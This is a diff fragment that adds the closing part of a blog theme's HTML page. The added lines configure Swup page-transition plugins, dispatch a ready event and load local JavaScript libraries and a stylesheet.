+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
